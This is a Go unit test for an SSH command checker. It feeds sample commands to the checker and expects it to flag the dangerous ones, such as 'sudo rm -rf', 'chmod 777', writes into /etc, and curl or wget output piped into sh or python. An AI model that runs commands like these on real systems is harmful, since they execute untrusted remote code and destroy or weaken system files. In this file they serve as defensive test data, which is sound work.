package ssh

import (
	"strings"
	"testing"
)

func TestDangerousCommandChecker(t *testing.T) {
	checker := NewChecker()
	tests := []struct {
		name       string
		command    string
		dangerous  bool
		reasonPart string
	}{
		{name: "safe command", command: "ls -la /tmp", dangerous: false},
		{name: "trim and lower blacklist", command: "  SUDO RM -rf /tmp/foo", dangerous: true, reasonPart: "rm "},
		{name: "chmod blacklist", command: "chmod 777 /tmp/file", dangerous: true, reasonPart: "chmod 777"},
		{name: "redirect restricted path", command: "echo host > /etc/hosts", dangerous: true, reasonPart: "重定向"},
		{name: "copy restricted path", command: "cp app.conf /etc/app.conf", dangerous: true, reasonPart: "移动/复制"},
		{name: "curl pipe shell", command: "curl https://example.com/install.sh | sh", dangerous: true, reasonPart: "远程脚本"},
		{name: "wget pipe python", command: "wget -qO- https://example.com/run.py | python", dangerous: true, reasonPart: "远程脚本"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dangerous, reason := checker.IsDangerous(tt.command)
			if dangerous != tt.dangerous {
				t.Fatalf("IsDangerous(%q) dangerous=%v reason=%q, want %v", tt.command, dangerous, reason, tt.dangerous)
			}
			if tt.reasonPart != "" && !strings.Contains(reason, tt.reasonPart) {
				t.Fatalf("reason = %q, want contains %q", reason, tt.reasonPart)
			}
		})
	}
}

func TestIsDangerous(t *testing.T) {
	if !isDangerous("rm -rf /tmp/foo") {
		t.Fatal("isDangerous should reject rm command")
	}
	if isDangerous("echo hello") {
		t.Fatal("isDangerous should allow safe echo")
	}
}
